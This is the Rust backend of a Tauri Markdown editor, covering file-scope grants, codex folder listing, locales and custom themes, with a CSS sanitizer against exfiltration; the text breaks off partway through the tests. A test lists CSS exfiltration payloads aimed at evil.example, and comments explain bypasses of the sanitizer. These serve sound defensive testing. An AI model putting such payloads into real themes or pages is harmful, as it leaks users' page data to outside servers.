use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::Mutex;
use tauri::{Emitter, Manager};
use tauri_plugin_dialog::DialogExt;
use tauri_plugin_fs::FsExt;
use tauri_plugin_opener::OpenerExt;

struct OpenedUrls(Mutex<Option<Vec<tauri::Url>>>);

// 已核准為「冊」的根資料夾（canonical paths）。只有經 pick_codex_root 的原生 dialog
// 選取的資料夾才會進此集合——前端無法注入任意路徑（防 XSS 任意路徑枚舉，決策 50）。
// 跨重啟持久化於 app_local_data_dir 私有檔（不經 store plugin / fs scope，XSS 不可寫）。
struct ApprovedRoots(Mutex<HashSet<PathBuf>>);

#[tauri::command]
fn grant_scope(app: tauri::AppHandle, path: String) -> Result<String, String> {
    let p = PathBuf::from(&path);
    let canonical = p.canonicalize().map_err(|e| e.to_string())?;
    let target = if canonical.is_file() {
        if !is_markdown(&canonical) {
            return Err("Only .md and .markdown files are allowed".into());
        }
        canonical
    } else if canonical.is_dir() {
        find_readme(&canonical).ok_or("No README.md found in this folder")?
    } else {
        return Err("Path is not a file or folder".into());
    };
    app.fs_scope()
        .allow_file(&target)
        .map_err(|e| e.to_string())?;
    Ok(target.to_string_lossy().into_owned())
}

fn find_readme(dir: &std::path::Path) -> Option<PathBuf> {
    let entries = std::fs::read_dir(dir).ok()?;
    entries.filter_map(|e| e.ok()).find_map(|entry| {
        let name = entry.file_name();
        let lower = name.to_string_lossy().to_lowercase();
        if matches!(lower.as_str(), "readme.md" | "readme.markdown") {
            entry.path().canonicalize().ok().filter(|p| p.is_file())
        } else {
            None
        }
    })
}

#[tauri::command]
fn get_opened_urls(state: tauri::State<'_, OpenedUrls>) -> Vec<String> {
    state
        .0
        .lock()
        .unwrap()
        .take()
        .unwrap_or_default()
        .into_iter()
        .filter_map(|url| url.to_file_path().ok())
        .map(|p| p.to_string_lossy().into_owned())
        .collect()
}

fn is_markdown(path: &std::path::Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| matches!(e.to_lowercase().as_str(), "md" | "markdown"))
}

const MAX_DEPTH: usize = 16;
const MAX_FILES: usize = 5000; // 上限：防誤選巨大資料夾拖慢遍歷 / 無界 Vec

// Read-only recursive listing of .md files under a folder (the "Codex" feature).
// Pure std::fs — does NOT touch fs_scope / allow_file: listing grants no scope.
// Opening a file still goes through per-file grant_scope (load-bearing wall intact).
#[tauri::command]
fn list_codex_files(
    state: tauri::State<'_, ApprovedRoots>,
    root: String,
) -> Result<Vec<String>, String> {
    let base = PathBuf::from(&root)
        .canonicalize()
        .map_err(|e| e.to_string())?;
    if !base.is_dir() {
        return Err("Path is not a folder".into());
    }
    // 授權閘：root 必須是經 pick_codex_root 核准過的冊，否則拒絕（防 XSS 任意路徑枚舉，決策 50）。
    if !state.0.lock().unwrap().contains(&base) {
        return Err("Folder is not an approved codex".into());
    }
    let mut out = Vec::new();
    walk(&base, 0, &mut out);
    Ok(out)
}

fn walk(dir: &std::path::Path, depth: usize, out: &mut Vec<String>) {
    if depth > MAX_DEPTH || out.len() >= MAX_FILES {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return; // unreadable dir: skip silently (mirrors find_readme .ok()?)
    };
    for entry in entries.filter_map(|e| e.ok()) {
        if out.len() >= MAX_FILES {
            return; // 達檔案數上限即停（含遞迴中途），避免無界遍歷
        }
        let path = entry.path();
        let Ok(meta) = path.symlink_metadata() else {
            continue;
        };
        if meta.file_type().is_symlink() {
            continue; // skip symlinks: avoid out-of-tree shortcuts + loops
        }
        if meta.is_dir() {
            walk(&path, depth + 1, out);
        } else if meta.is_file() && is_markdown(&path) {
            out.push(path.to_string_lossy().into_owned());
        }
    }
}

const APPROVED_ROOTS_FILE: &str = "codex_roots.json";

// 私有白名單檔路徑：app_local_data_dir/codex_roots.json（不在任何 fs scope 內，XSS 不可碰）。
fn approved_roots_path(app: &tauri::AppHandle) -> Option<PathBuf> {
    app.path()
        .app_local_data_dir()
        .ok()
        .map(|dir| dir.join(APPROVED_ROOTS_FILE))
}

// 啟動載入白名單：檔不存在 / 不可讀 / JSON 損毀一律回空集合（fail-safe）。
fn load_approved_roots(app: &tauri::AppHandle) -> HashSet<PathBuf> {
    let Some(path) = approved_roots_path(app) else {
        return HashSet::new();
    };
    let Ok(bytes) = std::fs::read(&path) else {
        return HashSet::new();
    };
    serde_json::from_slice::<Vec<String>>(&bytes)
        .map(|list| list.into_iter().map(PathBuf::from).collect())
        .unwrap_or_default()
}

// best-effort 持久化：寫前 create_dir_all（首次目錄不存在）；寫失敗不阻斷（下次 pick 再寫）。
fn persist_approved_roots(app: &tauri::AppHandle, roots: &HashSet<PathBuf>) {
    let Some(path) = approved_roots_path(app) else {
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let list: Vec<String> = roots
        .iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();
    if let Ok(json) = serde_json::to_vec(&list) {
        let _ = std::fs::write(&path, json);
    }
}

#[derive(serde::Serialize)]
struct CodexPick {
    root: String,
    files: Vec<String>,
}

// 開「冊」：原生 dialog 選資料夾 → 核准（加入 approved set + 持久化）→ 唯讀列舉 .md。
// dialog 由 Rust 持有：root 來自使用者真實選取、前端無法注入任意路徑（決策 50）。
// 必為 async fn：blocking_pick_folder 不可在 main thread。
#[tauri::command]
async fn pick_codex_root(app: tauri::AppHandle) -> Result<Option<CodexPick>, String> {
    let Some(picked) = app.dialog().file().blocking_pick_folder() else {
        return Ok(None); // 使用者取消
    };
    let canonical = picked
        .into_path()
        .map_err(|e| e.to_string())?
        .canonicalize()
        .map_err(|e| e.to_string())?;
    if !canonical.is_dir() {
        return Err("Selected path is not a folder".into());
    }
    {
        let state = app.state::<ApprovedRoots>();
        let mut set = state.0.lock().unwrap();
        set.insert(canonical.clone());
        persist_approved_roots(&app, &set);
    }
    let mut files = Vec::new();
    walk(&canonical, 0, &mut files);
    Ok(Some(CodexPick {
        root: canonical.to_string_lossy().into_owned(),
        files,
    }))
}

#[tauri::command]
fn load_locales(app: tauri::AppHandle) -> Result<serde_json::Value, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let locales_dir = app_dir.join("locales");
    if !locales_dir.exists() {
        std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
    }

    // 翻譯真相唯一來源是 repo 的 locales/*.json（前端 i18n.ts 亦 import 同一組檔案，
    // 編譯期內嵌保證兩端同步）。此處只在使用者語言包不存在時種下初始檔。
    const ZH_HANT_JSON: &str = include_str!("../../locales/zh_Hant.json");
    const EN_JSON: &str = include_str!("../../locales/en.json");

    let zh_hant_path = locales_dir.join("zh_Hant.json");
    if !zh_hant_path.exists() {
        let _ = std::fs::write(&zh_hant_path, ZH_HANT_JSON);
    }
    let en_path = locales_dir.join("en.json");
    if !en_path.exists() {
        let _ = std::fs::write(&en_path, EN_JSON);
    }

    // Read all JSON files in the locales directory
    let mut locales = serde_json::Map::new();
    if let Ok(entries) = std::fs::read_dir(&locales_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() && path.extension().and_then(|ext| ext.to_str()) == Some("json") {
                if let Some(filename) = path.file_stem().and_then(|s| s.to_str()) {
                    if let Ok(content_str) = std::fs::read_to_string(&path) {
                        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&content_str) {
                            locales.insert(filename.to_string(), json_val);
                        }
                    }
                }
            }
        }
    }

    Ok(serde_json::Value::Object(locales))
}

#[tauri::command]
async fn delete_codex_folder(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let p = PathBuf::from(&path);
    let canonical = p.canonicalize().map_err(|e| e.to_string())?;
    
    // Remove from ApprovedRoots
    {
        let state = app.state::<ApprovedRoots>();
        let mut set = state.0.lock().unwrap();
        set.remove(&canonical);
        persist_approved_roots(&app, &set);
    }
    
    Ok(())
}

#[tauri::command]
fn open_locales_dir(app: tauri::AppHandle) -> Result<(), String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let locales_dir = app_dir.join("locales");
    if !locales_dir.exists() {
        std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
    }
    app.opener()
        .open_path(locales_dir.to_string_lossy(), None::<&str>)
        .map_err(|e| e.to_string())
}

#[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct CustomTheme {
    pub id: String,
    pub name: String,
    pub css_content: String,
    pub file_path: String,
}

// Strip external resource references from theme CSS to prevent CSS exfiltration
// (attribute selectors + background-image can leak DOM data to attacker servers).
// Only data: URIs are allowed; @import is stripped entirely.
//
// 三階段，順序不可換——前兩階段各自封掉一種曾實測繞過整個過濾器的偽裝：
//   1. 移除註解：`/*x*/@import "https://…"` 曾讓 @import 行過濾失效
//   2. 解碼 escape：`\75 rl("https://…")` 對 CSS 引擎等價於 url()，但躲得過字面比對
//   3. 剝除外部 URL：對「URL 本身」下手而非函式名，故 image-set() 這類
//      不經 url() 的載入函式一併涵蓋，不必逐一追黑名單
//
// 注意這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
// （Markdown 外部圖片所需），故此函式是自訂主題外連的唯一防線。
fn sanitize_theme_css(css: &str) -> String {
    let decommented = strip_css_comments(css);
    let decoded = decode_css_escapes(&decommented);
    strip_external_urls(&decoded)
}

// 移除 /* */ 註解。字串內的 /* 不算註解，故需追蹤引號狀態。
// 註解替換為空白而非直接刪除，避免 `a/**/b` 黏合成新 token。
fn strip_css_comments(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    let mut in_string: Option<char> = None;

    while let Some(c) = chars.next() {
        match in_string {
            Some(quote) => {
                out.push(c);
                if c == '\\' {
                    if let Some(escaped) = chars.next() {
                        out.push(escaped);
                    }
                } else if c == quote {
                    in_string = None;
                }
            }
            None => {
                if c == '/' && chars.peek() == Some(&'*') {
                    chars.next();
                    let mut prev = '\0';
                    for cur in chars.by_ref() {
                        if prev == '*' && cur == '/' {
                            break;
                        }
                        prev = cur;
                    }
                    out.push(' ');
                } else {
                    if c == '"' || c == '\'' {
                        in_string = Some(c);
                    }
                    out.push(c);
                }
            }
        }
    }
    out
}

// 解碼 CSS escape：`\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
// 正規化後 `\75 rl(` 還原為 `url(`，才輪得到下一階段的比對。
fn decode_css_escapes(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();

    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let mut hex = String::new();
        while hex.len() < 6 {
            match chars.peek() {
                Some(h) if h.is_ascii_hexdigit() => {
                    hex.push(*h);
                    chars.next();
                }
                _ => break,
            }
        }
        if hex.is_empty() {
            if let Some(literal) = chars.next() {
                out.push(literal);
            }
        } else {
            // CSS 規範：hex escape 後的單一空白是終止符，不是內容
            if chars.peek().is_some_and(|c| c.is_whitespace()) {
                chars.next();
            }
            if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                out.push(decoded);
            }
        }
    }
    out
}

// 外部 URL 判定：含 `//`（scheme 分隔或 protocol-relative）即視為外部。
// data: URI 豁免——其 base64 內容本就可能含 `//`。
fn is_external_url(value: &str) -> bool {
    let trimmed = value.trim();
    trimmed.contains("//") && !trimmed.starts_with("data:")
}

fn strip_external_urls(css: &str) -> String {
    let mut result = String::with_capacity(css.len());
    let mut chars = css.char_indices().peekable();

    while let Some(&(i, c)) = chars.peek() {
        // url(...)：維持原規則，只允許 data: 與空值（相對路徑一併清除）
        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
            result.push_str("url(");
            for _ in 0..4 {
                chars.next();
            }
            let mut inside = String::new();
            let mut depth = 1;
            for (_, ch) in chars.by_ref() {
                if ch == ')' {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
                if ch == '(' {
                    depth += 1;
                }
                inside.push(ch);
            }
            let trimmed = inside.trim().trim_matches(|c: char| c == '"' || c == '\'');
            if trimmed.is_empty() || trimmed.starts_with("data:") {
                result.push_str(&inside);
            }
            result.push(')');
            continue;
        }
        // 引號字串：僅清空含外部 URL 者。image-set("https://…") 這類走這條，
        // 而 font-family: "JetBrains Mono" 不受影響。
        if c == '"' || c == '\'' {
            let quote = c;
            chars.next();
            let mut inner = String::new();
            for (_, ch) in chars.by_ref() {
                if ch == quote {
                    break;
                }
                inner.push(ch);
            }
            result.push(quote);
            if !is_external_url(&inner) {
                result.push_str(&inner);
            }
            result.push(quote);
            continue;
        }
        chars.next();
        result.push(c);
    }

    // @import 整行剝除（註解已於階段 1 移除，此處 trim_start 即足夠）
    result
        .lines()
        .filter(|line| {
            !line
                .trim_start()
                .get(..7)
                .is_some_and(|s| s.eq_ignore_ascii_case("@import"))
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn parse_theme_name(content: &str, default_id: &str) -> String {
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("/*") {
            if let Some(pos) = trimmed.find("Theme Name:") {
                let rest = &trimmed[pos + "Theme Name:".len()..];
                let cleaned = rest.trim_matches(|c: char| c == '*' || c == '/' || c.is_whitespace());
                if !cleaned.is_empty() {
                    return cleaned.to_string();
                }
            }
        }
    }
    default_id.to_string()
}

const TEMPLATE_EMERALD_FOREST: &str = r#"/* Theme Name: 翠綠森林 (Emerald Forest) */
html[data-theme="emerald-forest"] {
  --bg: #0d1b1e;
  --bg-bar: #122428;
  --bg-panel: #152828;
  --bg-inset: #091315;
  --fg: #e0ece4;
  --fg-strong: #f0f7f4;
  --fg-muted: #799a8b;
  --accent: #4ecca3;
  --accent-2: #36d399;
  --line: #1f3a34;
  --font-ui: "JetBrains Mono", ui-monospace, monospace;
  --font-edit: "JetBrains Mono", ui-monospace, "Noto Sans TC", monospace;
  --font-preview: "Literata", "Noto Serif TC", serif;
}

html[data-theme="emerald-forest"] body {
  background:
    radial-gradient(1.5px 1.5px at 70% 8%, rgba(78, 204, 163, 0.35), transparent 60%),
    radial-gradient(1px 1px at 30% 92%, rgba(78, 204, 163, 0.25), transparent 60%),
    var(--bg);
}
"#;

const TEMPLATE_NORDIC_FROST: &str = r#"/* Theme Name: 極光北歐 (Nordic Frost) */
html[data-theme="nordic-frost"] {
  --bg: #edf2f7;
  --bg-bar: #e2e8f0;
  --bg-panel: #e2e8f0;
  --bg-inset: rgba(203, 213, 225, 0.5);
  --fg: #1e293b;
  --fg-strong: #0f172a;
  --fg-muted: #64748b;
  --accent: #0284c7;
  --accent-2: #14b8a6;
  --line: #cbd5e1;
  --font-ui: "Space Mono", "Noto Sans TC", monospace;
  --font-edit: "Martian Mono", "Noto Sans TC", monospace;
  --font-preview: "Noto Sans TC", "PingFang TC", sans-serif;
}

html[data-theme="nordic-frost"] #toolbar {
  background: var(--bg-bar);
  border-bottom: 1px solid var(--line);
  box-shadow: 0 4px 12px rgba(15, 23, 42, 0.05);
}
"#;

const TEMPLATE_OFFICE_97: &str = r#"/* Theme Name: Office 97 (經典辦公室) */
html[data-theme="office-97"] {
  --bg: #d4d0c8;
  --bg-bar: #d4d0c8;
  --bg-panel: #d4d0c8;
  --bg-inset: #ffffff;
  --fg: #000000;
  --fg-strong: #000080;
  --fg-muted: #404040;
  --accent: #000080;
  --accent-2: #1084d0;
  --line: #808080;
  --font-ui: "Tahoma", "MS Sans Serif", "Arial", "Noto Sans TC", sans-serif;
  --font-edit: "Courier New", ui-monospace, monospace;
  --font-preview: "Times New Roman", "Noto Serif TC", serif;
}

html[data-theme="office-97"] #toolbar {
  background: #d4d0c8;
  border-bottom: 2px solid #808080;
  box-shadow: inset 1px 1px 0 #ffffff, inset -1px -1px 0 #404040;
}

html[data-theme="office-97"] #toolbar button {
  background: #d4d0c8;
  border-top: 1px solid #ffffff;
  border-left: 1px solid #ffffff;
  border-right: 1px solid #404040;
  border-bottom: 1px solid #404040;
  border-radius: 0;
  color: #000000;
  box-shadow: inset -1px -1px 0 #808080;
}

html[data-theme="office-97"] #toolbar button:hover {
  background: #e4e0d8;
  border-top: 1px solid #ffffff;
  border-left: 1px solid #ffffff;
  border-right: 1px solid #000000;
  border-bottom: 1px solid #000000;
}

html[data-theme="office-97"] #toolbar button:active {
  border-top: 1px solid #404040;
  border-left: 1px solid #404040;
  border-right: 1px solid #ffffff;
  border-bottom: 1px solid #ffffff;
  box-shadow: inset 1px 1px 0 #808080;
}

/* Toolbar Retro Icons for Office 97 */
html[data-theme="office-97"] #toolbar button svg {
  display: none !important;
}

html[data-theme="office-97"] #toolbar button::before {
  content: "";
  width: 16px;
  height: 16px;
  display: block;
  background-repeat: no-repeat;
  background-position: center;
  background-size: contain;
}

html[data-theme="office-97"] #btn-new::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' stroke-width='1' d='M3 1h7l4 4v10H3z'/%3E%3Cpath fill='%23c0c0c0' stroke='%23000000' stroke-width='1' d='M10 1v4h4'/%3E%3Cline x1='5' y1='7' x2='11' y2='7' stroke='%23808080'/%3E%3Cline x1='5' y1='9' x2='11' y2='9' stroke='%23808080'/%3E%3Cline x1='5' y1='11' x2='9' y2='11' stroke='%23808080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-open::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffca28' stroke='%23b26a00' d='M1 3h5l2 2h7v9H1z'/%3E%3Cpath fill='%23ffe082' stroke='%23b26a00' d='M1 6h14l-2 7H3z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-codex::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='2' width='12' height='12' fill='%23000080' stroke='%23000000' rx='1'/%3E%3Crect x='4' y='2' width='2' height='12' fill='%23ffffff'/%3E%3Crect x='7' y='5' width='5' height='2' fill='%23ffca28'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-save::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='1' width='12' height='14' fill='%23000080' stroke='%23000000' rx='1'/%3E%3Crect x='4' y='1' width='7' height='5' fill='%23c0c0c0' stroke='%23808080'/%3E%3Crect x='5' y='2' width='2' height='3' fill='%23000080'/%3E%3Crect x='4' y='8' width='8' height='6' fill='%23ffffff' stroke='%23808080'/%3E%3Cline x1='6' y1='10' x2='10' y2='10' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-export::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' d='M2 1h8v12H2z'/%3E%3Cpath fill='%23008000' d='M8 4v3H4v2h4v3l5-4z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-fullscreen::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='2' width='12' height='12' fill='none' stroke='%23000000' stroke-width='2'/%3E%3Crect x='2' y='2' width='12' height='3' fill='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="write"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffca28' stroke='%23000000' d='M12 1l3 3-9 9-4 1 1-4z'/%3E%3Cpath fill='%23ff8f00' d='M10 3l3 3-7 7-3-3z'/%3E%3Cpath fill='%23000000' d='M2 14l-1 1 2-1z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="split"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='1' y='2' width='6' height='12' fill='%23ffffff' stroke='%23000000'/%3E%3Crect x='9' y='2' width='6' height='12' fill='%23ffffff' stroke='%23000000'/%3E%3Cline x1='3' y1='5' x2='5' y2='5' stroke='%23000080'/%3E%3Cline x1='11' y1='5' x2='13' y2='5' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="read"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' d='M1 3c3-1 6 0 7 2 1-2 4-3 7-2v9c-3-1-6 0-7 2-1-2-4-3-7-2z'/%3E%3Cline x1='8' y1='5' x2='8' y2='14' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-settings::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23808080' stroke='%23000000' d='M12 1a3 3 0 0 0-3 4L2 12l2 2 7-7a3 3 0 0 0 1-6z'/%3E%3Ccircle cx='13' cy='3' r='1' fill='%23ffffff'/%3E%3C/svg%3E");
}
"#;

#[tauri::command]
fn load_custom_themes(app: tauri::AppHandle) -> Result<Vec<CustomTheme>, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let emerald_path = themes_dir.join("emerald-forest.css");
    if !emerald_path.exists() {
        let _ = std::fs::write(&emerald_path, TEMPLATE_EMERALD_FOREST);
    }
    let nordic_path = themes_dir.join("nordic-frost.css");
    if !nordic_path.exists() {
        let _ = std::fs::write(&nordic_path, TEMPLATE_NORDIC_FROST);
    }
    let office_path = themes_dir.join("office-97.css");
    if !office_path.exists() {
        let _ = std::fs::write(&office_path, TEMPLATE_OFFICE_97);
    }

    let mut themes = Vec::new();
    if let Ok(entries) = std::fs::read_dir(&themes_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() && path.extension().and_then(|ext| ext.to_str()) == Some("css") {
                if let Some(id) = path.file_stem().and_then(|s| s.to_str()) {
                    if let Ok(raw_css) = std::fs::read_to_string(&path) {
                        let name = parse_theme_name(&raw_css, id);
                        themes.push(CustomTheme {
                            id: id.to_string(),
                            name,
                            css_content: sanitize_theme_css(&raw_css),
                            file_path: path.to_string_lossy().into_owned(),
                        });
                    }
                }
            }
        }
    }
    themes.sort_by(|a, b| a.id.cmp(&b.id));
    Ok(themes)
}

#[tauri::command]
fn open_themes_dir(app: tauri::AppHandle) -> Result<(), String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }
    app.opener()
        .open_path(themes_dir.to_string_lossy(), None::<&str>)
        .map_err(|e| e.to_string())
}

#[tauri::command]
async fn import_theme_file(app: tauri::AppHandle) -> Result<Option<Vec<CustomTheme>>, String> {
    let Some(picked) = app
        .dialog()
        .file()
        .add_filter("CSS Theme", &["css"])
        .blocking_pick_file()
    else {
        return Ok(None);
    };

    let source_path = picked.into_path().map_err(|e| e.to_string())?;
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let file_name = source_path
        .file_name()
        .ok_or_else(|| "Invalid file name".to_string())?;
    let dest_path = themes_dir.join(file_name);

    if dest_path.exists() {
        return Err(format!("Theme file '{}' already exists in themes directory", file_name.to_string_lossy()));
    }

    std::fs::copy(&source_path, &dest_path).map_err(|e| e.to_string())?;

    let themes = load_custom_themes(app)?;
    Ok(Some(themes))
}

#[tauri::command]
fn copy_builtin_theme_template(app: tauri::AppHandle, theme_id: String) -> Result<Vec<CustomTheme>, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let (filename, content) = match theme_id.as_str() {
        "vol-de-nuit" => ("vol-de-nuit-custom.css", r#"/* Theme Name: 暗夜飛行 (自訂版) */
html[data-theme="vol-de-nuit-custom"] {
  --bg: #14161f;
  --bg-panel: #1b1e2b;
  --bg-inset: #10131d;
  --fg: #e6e9f0;
  --fg-strong: #e6e9f0;
  --fg-muted: #8a93ad;
  --accent: #e8b84b;
  --accent-2: #7fd1c9;
  --line: #2a2f42;
  --font-ui: "JetBrains Mono", ui-monospace, monospace;
  --font-edit: "JetBrains Mono", ui-monospace, "Noto Sans TC", monospace;
  --font-preview: "Literata", "Noto Serif TC", serif;
}
"#),
        "inkstone" => ("inkstone-custom.css", r#"/* Theme Name: 硯台 (自訂版) */
html[data-theme="inkstone-custom"] {
  --bg: #f5f2eb;
  --bg-bar: #f1ede3;
  --bg-panel: #f5f2eb;
  --bg-inset: rgba(214, 209, 196, 0.32);
  --fg: #1f1d1a;
  --fg-strong: #3d3a33;
  --fg-muted: #6b675e;
  --accent: #3d3a33;
  --accent-2: #6b675e;
  --line: #d6d1c4;
  --cinnabar: #b3402a;
  --font-ui: "Space Mono", "Noto Sans TC", monospace;
  --font-edit: "Martian Mono", "Noto Sans TC", monospace;
  --font-preview: "Noto Sans TC", "PingFang TC", sans-serif;
}
"#),
        _ => return Err("Unknown built-in theme template".to_string()),
    };

    let target_file = themes_dir.join(filename);
    let _ = std::fs::write(target_file, content);

    load_custom_themes(app)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let app = tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_store::Builder::new().build())
        .plugin(tauri_plugin_persisted_scope::init())
        .plugin(tauri_plugin_opener::init())
        .manage(OpenedUrls(Mutex::new(None)))
        .manage(ApprovedRoots(Mutex::new(HashSet::new())))
        .invoke_handler(tauri::generate_handler![
            grant_scope,
            get_opened_urls,
            list_codex_files,
            pick_codex_root,
            load_locales,
            open_locales_dir,
            delete_codex_folder,
            load_custom_themes,
            open_themes_dir,
            import_theme_file,
            copy_builtin_theme_template
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application");

    // 啟動載入持久化的冊白名單（決策 50；fail-safe 回空集合，不阻斷啟動）。
    {
        let loaded = load_approved_roots(app.handle());
        *app.state::<ApprovedRoots>().0.lock().unwrap() = loaded;
    }

    // Windows: file path comes as CLI argument (RunEvent::Opened is macOS-only)
    #[cfg(target_os = "windows")]
    {
        if let Some(path_str) = std::env::args().nth(1) {
            let path = PathBuf::from(&path_str);
            if is_markdown(&path) {
                if let Ok(url) = tauri::Url::from_file_path(&path) {
                    app.state::<OpenedUrls>().0.lock().unwrap().replace(vec![url]);
                }
            }
        }
    }

    app.run(|app_handle, event| {
        #[cfg(any(target_os = "macos", target_os = "ios", target_os = "android"))]
        if let tauri::RunEvent::Opened { urls } = event {
            let md_urls: Vec<tauri::Url> = urls
                .into_iter()
                .filter(|url| {
                    url.to_file_path()
                        .ok()
                        .map(|p| is_markdown(&p))
                        .unwrap_or(false)
                })
                .collect();
            if md_urls.is_empty() {
                return;
            }
            let paths: Vec<String> = md_urls
                .iter()
                .filter_map(|url| url.to_file_path().ok())
                .map(|p| p.to_string_lossy().into_owned())
                .collect();
            app_handle
                .state::<OpenedUrls>()
                .0
                .lock()
                .unwrap()
                .replace(md_urls);
            let _ = app_handle.emit("file-open", &paths);
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    // 以下四個 payload 皆為實測繞過舊版 sanitizer、並在真實瀏覽器引擎確認會發出
    // 外連請求的形式（2026-07-26 取證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
    #[test]
    fn blocks_proven_exfiltration_bypasses() {
        let payloads = [
            // 註解前綴讓 @import 躲過行首比對
            r#"/*x*/@import "https://evil.example/x.css";"#,
            r#"/*a*/ @import "https://evil.example/x.css";"#,
            // escape sequence 對 CSS 引擎等價於 url()
            r#"body { background: \75 rl("https://evil.example/leak.png"); }"#,
            // image-set 系列根本不含 "url(" 字面
            r#"body { background-image: image-set("https://evil.example/is.png" 1x); }"#,
            r#"body { background-image: -webkit-image-set("https://evil.example/w.png" 1x); }"#,
            // 直接形式（舊版已擋，防回歸）
            r#"@import "https://evil.example/x.css";"#,
            r#"body { background: url("https://evil.example/leak.png"); }"#,
            // protocol-relative
            r#"body { background: url(//evil.example/leak.png); }"#,
        ];
        for payload in payloads {
            let out = sanitize_theme_css(payload);
            assert!(
                !out.contains("evil.example"),
                "payload 未被擋下:\n  輸入: {payload}\n  輸出: {out}"
            );
        }
    }

    #[test]
    fn preserves_legitimate_theme_css() {
        let css = r#"html[data-theme="x"] {
  --bg: #0d1b1e;
  --font-ui: "JetBrains Mono", ui-monospace, monospace;
}
html[data-theme="x"] body {
  background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78, 204, 163, 0.35), transparent 60%), var(--bg);
}"#;
        let out = sanitize_theme_css(css);
        assert!(out.contains("--bg: #0d1b1e;"), "CSS 變數被破壞: {out}");
